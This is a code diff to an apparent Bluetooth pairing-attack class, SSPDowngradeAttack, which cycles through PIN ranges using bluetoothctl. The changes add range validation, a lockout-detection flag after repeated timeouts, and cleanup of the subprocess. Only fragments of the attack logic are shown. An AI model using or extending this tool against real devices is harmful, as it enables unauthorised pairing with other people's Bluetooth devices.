@@ -346,8 +346,14 @@ class SSPDowngradeAttack:
             "attempts": 0,
             "time_elapsed": 0.0,
             "downgrade_succeeded": False,
+            "lockout_detected": False,
             "notes": [],
         }
+
+        if pin_start > pin_end:
+            error(f"Invalid PIN range: start ({pin_start}) > end ({pin_end})")
+            result["notes"].append(f"Invalid range: {pin_start}-{pin_end}")
+            return result
 
         start_time = time.time()
 
@@ -407,6 +413,7 @@ class SSPDowngradeAttack:
                     result["notes"].append(
                         f"Lockout after {i + 1} attempts (3 consecutive timeouts)"
                     )
+                    result["lockout_detected"] = True
                     break
             else:
                 consecutive_timeouts = 0
@@ -451,6 +458,7 @@ class SSPDowngradeAttack:
         time.sleep(0.1)
 
         t_start = time.time()
+        proc = None
         try:
             proc = subprocess.Popen(
                 ["bluetoothctl"],
@@ -515,6 +523,13 @@ class SSPDowngradeAttack:
             output = output_buf
         except Exception:
             return False, time.time() - t_start
+        finally:
+            if proc is not None and proc.poll() is None:
+                try:
+                    proc.kill()
+                    proc.wait(timeout=3)
+                except (subprocess.TimeoutExpired, OSError):
+                    pass
 
         elapsed = time.time() - t_start
 
